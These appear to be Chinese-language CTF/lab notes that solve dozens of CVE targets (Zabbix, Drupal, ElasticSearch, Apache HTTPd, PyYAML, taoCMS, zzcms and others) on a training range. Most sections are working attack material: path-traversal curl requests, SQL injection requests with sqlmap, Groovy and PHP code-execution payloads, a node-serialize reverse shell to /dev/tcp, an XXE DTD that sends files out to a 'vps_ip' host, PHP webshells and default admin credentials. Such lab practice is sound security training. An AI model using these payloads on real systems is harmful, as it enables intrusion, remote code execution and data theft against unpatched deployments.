## CVE-2022-23134 Zabbix setup 访问控制登录绕过

*靶标介绍：*

Zabbix Sia Zabbix是拉脱维亚Zabbix SIA（Zabbix Sia）公司的一套开源的监控系统。该系统支持网络监控、服务器监控、云监控和应用监控等。 Zabbix 存在安全漏洞，该漏洞源于在初始设置过程之后，setup.php 文件的某些步骤不仅可以由超级管理员访问，也可以由未经身份验证的用户访问。

Admin/zabbix

![image-20230712112801046](%E9%9D%B6%E5%9C%BA.assets/image-20230712112801046.png)

![image-20230712112857880](%E9%9D%B6%E5%9C%BA.assets/image-20230712112857880.png)

![image-20230712112910516](%E9%9D%B6%E5%9C%BA.assets/image-20230712112910516.png)





## CVE-2022-0543 Redis 沙盒逃逸漏洞

*靶标介绍：*

Redis 存在代码注入漏洞，攻击者可利用该漏洞远程执行代码

/?url=file:///flag

![image-20230712143748361](%E9%9D%B6%E5%9C%BA.assets/image-20230712143748361.png)



## CVE-2022-25401 Cuppa CMS v1.0 任意文件读

*靶标介绍：*

Cuppa CMS v1.0 administrator/templates/default/html/windows/right.php文件存在任意文件读取漏洞

```csharp
curl -X POST "http://xxx.ichunqiu.com/templates/default/html/windows/right.php" -d "url=../../../../../../../../../../../../flag"
```



```csharp
curl -X POST "http://eci-2zebir6z1t9jpsybrz6d.cloudeci1.ichunqiu.com/templates/default/html/windows/right.php" -d "url=../../../../../../../../../../../../flag"
```

![image-20230712144440644](%E9%9D%B6%E5%9C%BA.assets/image-20230712144440644.png)

## CVE-2014-3704 Drupal cms sql注入

*靶标介绍：*

Drupal是使用PHP语言编写的开源内容管理框架（CMF），它由由内容管理系统和PHP开发框架共同构成，在GPL2.0及更新协议下发布。连续多年荣获全球最佳CMS大奖，是基于PHP语言最著名的WEB应用程序。 Drupal 是一款用量庞大的CMS，其7.0~7.31版本中存在一处无需认证的SQL漏洞。通过该漏洞，攻击者可以执行任意SQL语句，插入、修改管理员信息，甚至执行任意代码。

1.txt

```
POST /?q=node&destination=node HTTP/1.1
Host: eci-2zeacjw9s6fub0sr7tat.cloudeci1.ichunqiu.com
Accept-Encoding: gzip, deflate
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 122
 
pass=lol&form_build_id=&form_id=user_login_block&op=Log+in&name[0 or updatexml(0,concat(0xa,*),0)%23]=bob&name[0]=a
```

sqlmap

```
sqlmap -r 1.txt  --file-read "/flag" --batch
```

![image-20230712151527525](%E9%9D%B6%E5%9C%BA.assets/image-20230712151527525.png)

## CVE-2014-3529 Apache POI < 3.10.1 XXE

*靶标介绍：*

Apache POI 3.10.1 之前的 OPC SAX 设置允许远程攻击者通过 OpenXML 文件读取任意文件，该文件包含与 XML 外部实体 (XXE) 问题相关的 XML 外部实体声明和实体引用。

一：使用python开启一个web服务

python -m http.server 80

二：在web服务器目录下放一个xxe.dtd

```
<!ENTITY % all "<!ENTITY &#x25; send SYSTEM 'http://vps_ip/%file;'>">
%all;
```


三： 制作包含payload的Excel

[Content_Types].xml

```
<!DOCTYPE ANY [ <!ENTITY % file SYSTEM "file:///flag"> 
<!ENTITY % dtd SYSTEM "http://127.0.0.1/xxe.dtd">
%dtd; %send;]>
```



![image-20230712153657731](%E9%9D%B6%E5%9C%BA.assets/image-20230712153657731.png)

 然后需要压缩[Content_Types].xml为zip文件

![image-20230712153708471](%E9%9D%B6%E5%9C%BA.assets/image-20230712153708471.png)

[Content_Types].zip修改为xxe.xlsx

![image-20230712153818144](%E9%9D%B6%E5%9C%BA.assets/image-20230712153818144.png)

靶场测试


 上传xxe.xlsx文件

![image-20230712153845560](%E9%9D%B6%E5%9C%BA.assets/image-20230712153845560.png)

复制下来进行解析测试

![image-20230712153902250](%E9%9D%B6%E5%9C%BA.assets/image-20230712153902250.png)

![image-20230712153938541](%E9%9D%B6%E5%9C%BA.assets/image-20230712153938541.png)

 回到web服务器可以查看到访问记录

即可成功获取flag

![image-20230712153956242](%E9%9D%B6%E5%9C%BA.assets/image-20230712153956242.png)





## CVE-2015-1427 ElasticSearch RCE

*靶标介绍：*

ElasticSearch RCE

```
POST /website/blog/ HTTP/1.1
Host: eci-2zeiruv5maej7rdx7viy.cloudeci1.ichunqiu.com:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 25

{
	  "name": "caogen"
}
```

![image-20230712155753922](%E9%9D%B6%E5%9C%BA.assets/image-20230712155753922.png)



```
POST /_search?pretty HTTP/1.1
Host: eci-2zeiruv5maej7rdx7viy.cloudeci1.ichunqiu.com:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 491

{
    "size":1,
    "script_fields": {
        "test#": {  
            "script":
 
             "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getInputStream())).readLines()",
 
            "lang": "groovy"
        }
    }
 
}
```

![image-20230712155854973](%E9%9D%B6%E5%9C%BA.assets/image-20230712155854973.png)



csdn上的空格有问题

```
POST /_search?pretty HTTP/1.1
Host: eci-2zeiruv5maej7rdx7viy.cloudeci1.ichunqiu.com:9200
Accept: */*
Accept-Language: en
User-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)
Connection: close
Content-Type: application/text
Content-Length: 498

{
    "size":1,
    "script_fields": {
        "test#": {  
            "script":
 
             "java.lang.Math.class.forName(\"java.io.BufferedReader\").getConstructor(java.io.Reader.class).newInstance(java.lang.Math.class.forName(\"java.io.InputStreamReader\").getConstructor(java.io.InputStream.class).newInstance(java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"cat /flag\").getInputStream())).readLines()",
 
            "lang": "groovy"
        }
    }
 
}
```

![image-20230712160008461](%E9%9D%B6%E5%9C%BA.assets/image-20230712160008461.png)

![image-20230712160025355](%E9%9D%B6%E5%9C%BA.assets/image-20230712160025355.png)



## CVE-2017-1000480 Smarty <= 3.1.32 PHP代码执行漏洞

*靶标介绍：*

3.1.32 之前的 Smarty 3 在未清理模板名称的自定义资源上调用 fetch() 或 display() 函数时容易受到 PHP 代码注入的影响。

```
/index.php?eval=*/phpinfo();/*
```

![image-20230712160304795](%E9%9D%B6%E5%9C%BA.assets/image-20230712160304795.png)

```
/index.php?eval=*/readfile('/flag');/*
```

![image-20230712160449940](%E9%9D%B6%E5%9C%BA.assets/image-20230712160449940.png)

## CVE-2017-5941 Node.js node-serialize RCE

*靶标介绍：*

在 Node.js 的 node-serialize 包 0.0.4 中发现了一个问题。传递到 unserialize() 函数的不受信任的数据可以被利用，通过传递带有立即调用函数表达式 (IIFE) 的 JavaScript 对象来实现任意代码执行。

```
_$$ND_FUNC$$_function (){require('child_process').exec('bash -c "bash -i >& /dev/tcp/127.0.0.1/9991 0>&1"')}()
```

![image-20230712161613674](%E9%9D%B6%E5%9C%BA.assets/image-20230712161613674.png)





## CVE-2022-25488 Atom CMS v2.0 sql注入漏洞

*靶标介绍：*

Atom CMS v2.0存在sql注入漏洞在/admin/ajax/avatar.php页面

```
sqlmap -u http://eci-2zeewd3dr3xikxneleeu.cloudeci1.ichunqiu.com/admin/ajax/avatar.php?id=1 --file-read "/flag" --batch
```

![image-20230714104254411](%E9%9D%B6%E5%9C%BA.assets/image-20230714104254411.png)

## CVE-2022-26201 Victor CMS v1.0 存在二次注入漏洞

*靶标介绍：*

Victor CMS v1.0 存在二次注入漏洞

```
sqlmap -u http://eci-2ze25zfdfvdsdqnckv0w.cloudeci1.ichunqiu.com/post.php?post=1 --file-read "/flag" --batch
```

## CVE-2022-23316 taoCMS v3.0.2 存在任意文件读取漏洞



*靶标介绍：*

taoCMS v3.0.2 存在任意文件读取漏洞

*收藏：*未收藏

*路径：*

[http://eci-2ze2wzytqkaq5975rl35.cloudeci1.ichunqiu.com:80](http://eci-2ze2wzytqkaq5975rl35.cloudeci1.ichunqiu.com/)

/admin/admin.php?action=frame&ctrl=login

admin/tao

![image-20230712114356416](%E9%9D%B6%E5%9C%BA.assets/image-20230712114356416.png)

![image-20230712114431306](%E9%9D%B6%E5%9C%BA.assets/image-20230712114431306.png)



## CVE-2022-25578 Taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码

*靶标介绍：*

taocms v3.0.2允许攻击者通过编辑.htaccess文件执行任意代码



/admin admin/tao

![image-20230714103546513](%E9%9D%B6%E5%9C%BA.assets/image-20230714103546513.png)

## CVE-2022-23880 TaoCMS v3.0.2 任意文件上传漏洞

*靶标介绍：*

taoCMS v3.0.2 文件管理处存在任意文件上传漏洞，攻击者可执行任意代码

/admin admin/tao

和前面一样的路径穿越读文件



## CVE-2022-25505 Taocms v3.0.2 存在sql注入漏洞

*靶标介绍：*

Taocms v3.0.2 存在sql注入漏洞

之前的路径穿越可以看见flag 就是看不了

参考https://github.com/taogogo/taocms/issues/27 需要自己抓包

```
POST /admin/admin.php HTTP/1.1
Host: eci-2zebqkv83e5lad89szgk.cloudeci1.ichunqiu.com
Content-Length: 175
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2zebqkv83e5lad89szgk.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zebqkv83e5lad89szgk.cloudeci1.ichunqiu.com/admin/admin.php?action=category&id=2&ctrl=edit
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=rm80snmfkjuvm0dikf0h4q0lrp
Connection: close

name=%E6%97%A5%E8%AE%B0&nickname=1&fid=&cattpl=&listtpl=&distpl=&intro=%E6%97%A5%E8%AE%B0%E6%9C%AC&orders=0&status=1&action=category&id=2&ctrl=update&Submit=%E6%8F%90%E4%BA%A4
```

```
sqlmap -r 1.txt  --file-read "/flag" --batch
```

![image-20230714113159137](%E9%9D%B6%E5%9C%BA.assets/image-20230714113159137.png)

## CVE-2021-46204 Taocms v3.0.2 sql注入漏洞

*靶标介绍：*

Taocms v3.0.2 taocmsincludeModelArticle.php 存在sql注入漏洞

https://github.com/taogogo/taocms/issues/14 需要自己抓包

```
sqlmap -r 1.txt  --file-read "/flag" --batch
```



```
POST /admin/admin.php HTTP/1.1
Host: eci-2zed7jrc3f6mskccya39.cloudeci1.ichunqiu.com
Content-Length: 168
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
Origin: http://eci-2zed7jrc3f6mskccya39.cloudeci1.ichunqiu.com
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://eci-2zed7jrc3f6mskccya39.cloudeci1.ichunqiu.com/admin/admin.php?action=link&id=2&ctrl=edit
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: PHPSESSID=f6jkvvo6ntk2ah4k5mq78f2rar
Connection: close

name=taoCMS&urls=http%3A%2F%2Fwww.taocms.org&content=taoCMS%E5%AE%98%E6%96%B9%E7%BD%91%E7%AB%99&orders=0&status=1&action=link&id=2&ctrl=update&Submit=%E6%8F%90%E4%BA%A4
```

## CVE-2021-46203 Taocms v3.0.2 任意文件读取

*靶标介绍：*

Taocms v3.0.2 path参数存在漏洞造成任意文件读取

文件管理里面利用 ../../../../../../ 点击下载 下载flag.htm

![image-20230714115008201](%E9%9D%B6%E5%9C%BA.assets/image-20230714115008201.png)

## CVE-2021-44983 Taocms 3.0.1 登陆后台后文件管理处存在任意文件下载漏洞

*靶标介绍：*

taocms 3.0.1 登陆后台后文件管理处存在任意文件下载漏洞

老洞通杀 不说了。。。



## CVE-2021-44915 Taocms 3.0.2 存在sql盲注

*靶标介绍：*

Taocms 3.0.2 存在sql盲注

用前面的sql注入





## CVE-2019-7720 Taocms < 3.0.1 存在代码注入漏洞

*靶标介绍：*

taocms < 3.0.1 存在代码注入漏洞

```
db=Mysql&db_name=%7C127.0.0.1%3A3306%7Croot%7Croot%7Ccms%7C');assert($_REQUEST['cmd']);//&tb=test&Submit=%E7%82%B9%E5%87%BB%E6%AD%A4%E5%A4%84%E5%BC%80%E5%A7%8B%E5%AE%89%E8%A3%85%E5%85%8D%E8%B4%B9%E5%BC%80%E6%BA%90%E7%9A%84taoCMS%E7%B3%BB%E7%BB%9F
```

![image-20230714120617271](%E9%9D%B6%E5%9C%BA.assets/image-20230714120617271.png)



![image-20230714120638785](%E9%9D%B6%E5%9C%BA.assets/image-20230714120638785.png)



/config.php?cmd=readfile("/flag");

![image-20230714120726791](%E9%9D%B6%E5%9C%BA.assets/image-20230714120726791.png)



## CVE-2022-25411 Maxsite CMS文件上传漏洞

*靶标介绍：*

MaxSite CMS是俄国MaxSite CMS开源项目的一款网站内容管理系统。马克斯程序(MaxCMS)以开源、免费、功能强大、安全健壮、性能卓越、超级易用、模板众多、插件齐全等优势，受到众多企业和站长的喜爱。马克斯程序研发团队拥有多年的技术积累和产品开发经验，成立了官方技术支持团队、官方模板团队、官方插件团队。一切立足于站长利益、孜孜不倦的挖掘站长需求、不断提升产品体验，自主创新多项特色技术、提升网站品质!独立开发的管理员管理系统，可以对管理员进行更能人性化的管理网站。 Maxsite CMS存在文件上传漏洞，攻击者可利用该漏洞通过精心制作的PHP文件执行任意代码。账户为弱口令

https://github.com/maxsite/cms/issues/487

路径/index.php/admin/

admin/admin888 多试几次

在允许下载的文件类型里添加php

![image-20230714151301333](%E9%9D%B6%E5%9C%BA.assets/image-20230714151301333.png)

![image-20230714151320392](%E9%9D%B6%E5%9C%BA.assets/image-20230714151320392.png)



## CVE-2022-24223 AtomCMS SQL注入漏洞

*靶标介绍：*

AtomCMS SQL注入漏洞

/admin/login.php 抓包

sqlmap -r 1.txt   -D atomcms -T flag --dump -v

![image-20230714152306525](%E9%9D%B6%E5%9C%BA.assets/image-20230714152306525.png)



## [待]CVE-2021-41773 Apache HTTPd 2.4.49 路径穿越与命令执行漏洞

*靶标介绍：*

2021年10月5日，Apache发布更新公告，修复了Apache HTTP Server 2.4.49中的一个路径遍历和文件泄露漏洞（CVE-2021-41773）。 攻击者可以通过路径遍历攻击将 URL 映射到预期文档根目录之外的文件，如果文档根目录之外的文件不受“require all denied” 访问控制参数的保护，则这些恶意请求就会成功。除此之外，该漏洞还可能会导致泄漏 CGI 脚本等解释文件的来源。

```
curl -s --path-as-is "http://localhost:8787/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
curl -s --path-as-is "http://eci-2zee4ibl14pbhm9ar6a7.cloudeci1.ichunqiu.com/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd"
```

上面的都不行

https://www.freebuf.com/articles/web/293172.html

https://github.com/inbug-team/CVE-2021-41773_CVE-2021-42013

 开启代理，上神器burpsuite就可以开搞了。

```
路径穿越
GET /icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd HTTP/1.1
```

![image](%E9%9D%B6%E5%9C%BA.assets/1635402390_617a429640cb19cd7ffee.png!small)

```
RCE
POST /cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh HTTP/1.1
echo; ls（要执行的命令）
```

![image](%E9%9D%B6%E5%9C%BA.assets/1635402398_617a429e66e6fd4db57c4.png!small)

https://blog.qualys.com/vulnerabilities-threat-research/2021/10/27/apache-http-server-path-traversal-remote-code-execution-cve-2021-41773-cve-2021-42013





## CVE-2022-2509 WBCE CMS v1.5.2 RCE

*靶标介绍：*

WBCE CMS v1.5.2 /language/install.php 文件存在漏洞，攻击者可精心构造文件上传造成RCE

/admin admin/123456

add-ons -> languages ->选择文件

上传get_flag.php

```
<?php

system('cat /flag');
system('cat flag');
phpinfo();

?>
```

![image-20230714160613038](%E9%9D%B6%E5%9C%BA.assets/image-20230714160613038.png)



## CVE-2018-20604 lfdycms任意文件读取

*靶标介绍：*

雷风影视CMS是一款采用PHP基于THINKPHP3.2.3框架开发，适合各类视频、影视网站的影视内容管理程序，该CMS存在缺陷，可以通过 admin.php?s=/Template/edit/path/*web*..*..*..*..*1.txt 的方式读取任意文件。

/admin admin/admin

```
http://xxx.com/admin.php?s=/Template/edit/path/*web*..*..*..*..*..*..*flag
```

![image-20230714161159316](%E9%9D%B6%E5%9C%BA.assets/image-20230714161159316.png)



## CVE-2021-41402 flatCore-CMS v2.0.8 RCE

*靶标介绍：*

flatCore-CMS v2.0.8 存在后台任意代码执行漏洞

/acp admin/12345678

![image-20230714161555397](%E9%9D%B6%E5%9C%BA.assets/image-20230714161555397.png)

/upload/plugins/get_flag.php

![image-20230714161713342](%E9%9D%B6%E5%9C%BA.assets/image-20230714161713342.png)





## CVE-2018-12530 Metinfo 6.0.0任意文件删除

*靶标介绍：*

Metinfo 6.0.0任意文件删除。后台密码：f2xWcke5KN6pfebu

/admin admin/**f2xWcke5KN6pfebu**

删除安装锁

```
/admin/app/batch/csvup.php?fileField=test-1&flienamecsv=../../../config/install.lock
```

```
数据库密码= "*/assert($_REQUEST[1])/*"
/config/config_db.php?1=readfile("/flag");
```

![image-20230714162327891](%E9%9D%B6%E5%9C%BA.assets/image-20230714162327891.png)



## CVE-2018-1000533 gitlist远程命令任意执行

*靶标介绍：*

gitlist是一款使用PHP开发的图形化git仓库查看工具。在其0.6.0版本中，存在一处命令参数注入问题，可以导致远程命令执行漏洞

```
POST /example/tree/a/search HTTP/1.1
Host: eci-2ze2wzytqkara356p0ot.cloudeci1.ichunqiu.com
Cache-Control: max-age=0
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Connection: close
Content-Type: application/x-www-form-urlencoded
Content-Length: 57

query=--open-files-in-pager=cat /flag>/var/www/html/flag;
```

![image-20230714164152086](%E9%9D%B6%E5%9C%BA.assets/image-20230714164152086.png)

## [待]CVE-2020-14343 PyYAML反序列化漏洞

*靶标介绍：*

PyYAML中存在不安全的反序列化漏洞。攻击者可利用该漏洞执行任意代码

exploit.yaml

```
!!python/object/new:tuple
- !!python/object/new:map
  - !!python/name:eval
  - [ "\x5f\x5fimport\x5f\x5f('os')\x2esystem('cat /flag>static>flag')" ]
```



## CVE-2021-34257 WPanel4-CMS Authenticated RCE漏洞

*靶标介绍：*

WPanel是一个用于构建博客、网站和网络应用程序的CMS。 WPanel 4 4.3.1 及更低版本存在安全漏洞，该漏洞源于通过恶意 PHP 文件上传。

/index.php/admin/login

admin@admin.com/admin  勾上Change avatar

![image-20230717085120518](%E9%9D%B6%E5%9C%BA.assets/image-20230717085120518.png)

![image-20230717085242072](%E9%9D%B6%E5%9C%BA.assets/image-20230717085242072.png)





## CVE-2022-23906 CMS Made Simple v2.2.15 RCE

*靶标介绍：*

CMS Made Simple v2.2.15 被发现包含通过上传图片功能的远程命令执行 (RCE) 漏洞。此漏洞通过精心制作的图像文件被利用。

/admin admin/123456

![image-20230717160255504](%E9%9D%B6%E5%9C%BA.assets/image-20230717160255504.png)

![image-20230717160313673](%E9%9D%B6%E5%9C%BA.assets/image-20230717160313673.png)



## CVE-2021-41947 Subrion CMS v4.2.1 存在sql注入 授权

账号密码admin admin

http://eci-2zebv8ibalntahwjg8y0.cloudeci1.ichunqiu.com/panel/

登录

参考

https://github.com/nu11secur1ty/CVE-mitre/tree/main/CVE-2021-41947



payload 

/panel/visual-mode.json?get=access&type=blocks%27%20UNION%20ALL%20SELECT%20username,%20password%20FROM%20sbr415_members%20--%20-&object=landing_what_is_this&page=index

具体的表名需要在system->database->SQL TOOL下查看 我的环境表前缀为sbr415

![image-20230614113056503](%E9%9D%B6%E5%9C%BA.assets/image-20230614113056503.png)

然而本来就可以访问sql

![image-20230614114427744](%E9%9D%B6%E5%9C%BA.assets/image-20230614114427744.png)

### 方法一 使用sql生成webshell获取flag



生成webshell

参考文章

https://www.sqlsec.com/2020/11/mysql.html

```sql
show global variables like '%secure_file_priv%';
```



| Value | 说明                       |
| ----- | -------------------------- |
| NULL  | 不允许导入或导出           |
| /tmp  | 只允许在 /tmp 目录导入导出 |
| 空    | 不限制目录                 |

输出为空

![image-20230615110347327](%E9%9D%B6%E5%9C%BA.assets/image-20230615110347327.png)

![image-20230615110356112](%E9%9D%B6%E5%9C%BA.assets/image-20230615110356112.png)

![image-20230615110437458](%E9%9D%B6%E5%9C%BA.assets/image-20230615110437458.png)

因为这里不包括pht文件。

所以可以绕过。。。。。。。



```
select '<?php system($_GET["cmd"]); ?>' into outfile '/var/www/html/webshell.pht';
```



![image-20230615110743780](%E9%9D%B6%E5%9C%BA.assets/image-20230615110743780.png)



http://eci-2ze62tyap7hjzibphm4u.cloudeci1.ichunqiu.com/webshell.pht?cmd=ls /



```
http://eci-2ze62tyap7hjzibphm4u.cloudeci1.ichunqiu.com/webshell.pht?cmd=cat /flag
```

![image-20230615110814740](%E9%9D%B6%E5%9C%BA.assets/image-20230615110814740.png)



### 方法二 使用mysql任意文件读取 读取flag

早知道读根目录文件了。。。。。

load data local infile '/flag' into table sbr415_views_log fields terminated by '\n';

![image-20230615112544223](%E9%9D%B6%E5%9C%BA.assets/image-20230615112544223.png)

这个时候就可以看见 flag文件是存在的  但是读不出来结果。。。。

![image-20230615114338790](%E9%9D%B6%E5%9C%BA.assets/image-20230615114338790.png)

```
CREATE TABLE xxx(data TEXT); 
load data local infile '/etc/passwd' into table  xxx;
select * from xxx;
load data local infile '/flag' into table  xxx;
select * from xxx;
```

![image-20230615114356472](%E9%9D%B6%E5%9C%BA.assets/image-20230615114356472.png)

全是坑。。。。

## CVE-2018-19422 Subrion CMS 4.2.1 存在文件上传漏洞

*靶标介绍：*

Subrion CMS 4.2.1 存在文件上传漏洞

/panel/ admin/admin

select load_file('/flag');

![image-20230717161719754](%E9%9D%B6%E5%9C%BA.assets/image-20230717161719754.png)

## CVE-2017-11444 Subrion CMS < 4.1.5.10 存在sql注入漏洞

*靶标介绍：*

Subrion CMS < 4.1.5.10 存在sql注入漏洞

同上

## CVE-2021-43464 Subrion CMS 4.2.1 存在远程代码执行漏洞

*靶标介绍：*

Subrion CMS 4.2.1 存在远程代码执行漏洞

同上

## CVE-2020-5515 Gila CMS 1.11.8 sql注入

*靶标介绍：*

Gila CMS 1.11.8 /admin/sql?query= 存在sql注入

/admin admin@admin.com/admin

/admin/sql

select load_file('/flag');

![image-20230717163039628](%E9%9D%B6%E5%9C%BA.assets/image-20230717163039628.png)

## [待]CVE-2017-20063 Elefant CMS 1.3.12 存在文件上传漏洞

*靶标介绍：*

Elefant CMS 1.3.12 /filemanager/upload/drop 存在缺陷导致攻击者可上传webshell执行命令。账户信息：admin@admin.com

参考

https://curesec.com/blog/article/blog/Elefant-CMS-1312-RC-Code-Execution-188.html

## CVE-2021-40282 zzcms注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中dl/dl_download.php存在sql注入

/admin admin/admin

/uploadimg_form.php?noshuiyin=1&imgid=2

![image-20230717113701905](%E9%9D%B6%E5%9C%BA.assets/image-20230717113701905.png)

![image-20230717151911691](%E9%9D%B6%E5%9C%BA.assets/image-20230717151911691.png)



![image-20230717151806672](%E9%9D%B6%E5%9C%BA.assets/image-20230717151806672.png)

该burp包

```
POST /uploadfiles/2023-07/20230717071245648.phtml HTTP/1.1
Host: eci-2ze7rjoli0bs0u5a7k9b.cloudeci1.ichunqiu.com:80
Accept-Encoding: gzip, deflate
User-Agent: Mozilla/5.0 (Microsoft Windows NT 6.2.9200.0); rv:22.0) Gecko/20130405 Firefox/22.0
Cookie: PHPSESSID=p4p7l6ur1dauumro46d0bas5d2
Content-Type: application/x-www-form-urlencoded
Content-Length: 735
Connection: close

cmd=export%20PATH%3D%24PATH%3A%2Fusr%2Flocal%2Fsbin%3A%2Fusr%2Flocal%2Fbin%3A%2Fusr%2Fsbin%3A%2Fusr%2Fbin%3A%2Fsbin%3A%2Fbin%3BTAGS%3D%2288f2%22%221648%22%3BTAGE%3D%22f8a%22%22511%22%3Basenc()%7B%20cat%20%22%24%40%22%3B%20%7D%3Basexec()%20%7B%20APWD%3D%22root%22%3B%0A%20%20%20%20if%20%5B%20-z%20%24APWD%20%5D%3B%20then%20MYSQLPWD%3D%22%22%3B%20else%20MYSQLPWD%3D%22-p%24%7BAPWD%7D%22%3B%20fi%3B%0A%20%20%20%20mysql%20--xml%20--raw%20-B%20-hlocalhost%20-uroot%20%24MYSQLPWD%20-Dzzcms%20%3C%3C'EOF'%0ASELECT%20*%20FROM%20%60flag%60%20ORDER%20BY%201%20DESC%20LIMIT%200%2C20%3B%3B%0ASELECT%20ROW_COUNT()%20as%20%22Affected%20Rows%22%3B%0AEOF%0A%20%20%20%20%20%7D%3Becho%20-n%20%22%24TAGS%22%3Basexec%7Casenc%3Becho%20-n%20%22%24TAGE%22%3B
```





## CVE-2020-19961 zzcms 2019 存在sql注入漏洞

*靶标介绍：*

zz cms 2019 subzs.php 存在sql注入漏洞

/admin admin/admin

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

![image-20230718095347630](%E9%9D%B6%E5%9C%BA.assets/image-20230718095347630.png)



## CVE-2020-19960 zzcms 2019 存在sql注入漏洞

*靶标介绍：*

zz cms 2019 存在sql注入漏洞



同上



## CVE-2021-46436 zzcms注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.2中在admin/ad_manage.php存在sql注入漏洞

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

同上

## [待]CVE-2021-42945 zzcms注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms2021在admin/ask.php中存在sql注入

## CVE-2021-40281 zzcms注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.3中dl/dl_print.php存在sql注入

同上

## CVE-2021-40280 zzcms注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms8.2中在admin/dl_sendmail.php存在sql注入漏洞

/uploadimg_form.php?noshuiyin=1&imgid=2

image/jpeg

## [待]CVE-2021-40279 zzcms注入

*靶标介绍：*

站长招商网内容管理系统简称 ZZCMS，由ZZCMS团队开发，融入数据库优化，内容缓存，AJAX等技术，使网站的安全性 、稳定性 、负载能力得到可靠保障。源码开放，功能模块独立，便于二次开发。 zzcms2021在admin/bad.php中存在sql注入

参考

https://gist.github.com/aaaahuia/b99596c6de9bd6f60e0ddb7bf0bd13c4

```
POST /admin/bad.php HTTP/1.1
Host: your host
User-Agent: Mozilla/5.0 (Windows NT 10.0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/99.0.7113.93 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 69
Origin: http://zzcms.com
Connection: close
Referer: http://zzcms.com/admin/bad.php
Cookie: askbigclassid=0; asksmallclassid=0; __tins__713776=%7B%22sid%22%3A%201629992898141%2C%20%22vd%22%3A%206%2C%20%22expires%22%3A%201629995107025%7D; __51cke__=; __51laig__=20; bdshare_firstime=1629951198125; PHPSESSID=a5tlfr6q1ete0aaa6dq5pppi43; admin=admin; pass=21232f297a57a5a743894a0e4a801fc3; UserName=test; PassWord=098f6bcd4621d373cade4e832627b4f6
Upgrade-Insecure-Requests: 1

action=del&id[0]=0&id[1]=1 AND (SELECT 5584 FROM (SELECT(SLEEP(9)))a)
```

```
